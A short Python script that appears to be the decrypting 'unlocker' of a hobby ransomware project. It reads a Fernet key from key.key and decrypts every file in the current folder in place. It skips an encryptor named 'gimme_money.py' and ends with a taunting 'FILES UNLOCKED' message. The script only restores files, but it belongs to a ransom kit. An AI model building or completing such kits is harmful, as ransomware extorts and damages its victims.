import os
from cryptography.fernet import Fernet

files= []

for file in os.listdir():
    if file == 'gimme_money.py' or file == 'key.key' or file == 'unlocker.py':
        continue
    if os.path.isfile(file):
        files.append(file)

with open("key.key", "rb") as keyread:
    mykey = keyread.read()

for file in files:
    with open(file, "rb") as fileread:
        file_content = fileread.read()
    decrypted_content = Fernet(mykey).decrypt(file_content)
    with open(file, "wb") as filewrite:
        filewrite.write(decrypted_content)

print("FILES UNLOCKED! ENJOY YOUR POTATO PC")